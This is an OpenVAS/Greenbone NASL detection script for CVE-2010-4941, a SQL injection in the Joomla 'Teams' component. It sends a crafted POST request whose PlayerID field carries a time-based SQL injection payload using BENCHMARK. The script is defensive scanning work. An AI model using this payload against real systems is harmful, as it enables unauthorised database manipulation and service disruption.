# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802189");
  script_version("2022-02-17T14:14:34+0000");
  script_cve_id("CVE-2010-4941");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-02-17 14:14:34 +0000 (Thu, 17 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-11-09 13:02:45 +0530 (Wed, 09 Nov 2011)");

  script_name("Joomla 'Teams' Component SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/40933");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/14598/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/512974/100/0/threaded");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL queries by
injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Joomla Team Component version 1_1028_100809_1711");

  script_tag(name:"insight", value:"Input passed via the 'PlayerID' parameter to 'index.php' is not properly
sanitised before being used in SQL queries.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a
newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Joomla with Teams component is prone to a SQL injection vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();

filename = dir + "/index.php";
host = get_host_name();
postData = "FirstName=" + vt_strings["default"] + "&LastName=" + vt_strings["default_dash"] + "&Notes=sds&TeamNames" +
           "[1]=on&UniformNumber[1]=1&Active=Y&cid[]=&PlayerID=-1 OR (SELECT" +
           "(IF(0x41=0x41,BENCHMARK(99999999,NULL),NULL)))&option=com_teams&" +
           "task=save&controller=player";

sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n\r\n",
                postData);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

if (vt_strings["default"] >< rcvRes && vt_strings["default_dash"] >< rcvRes) {
  security_message(port: port);
  exit(0);
}

exit(99);
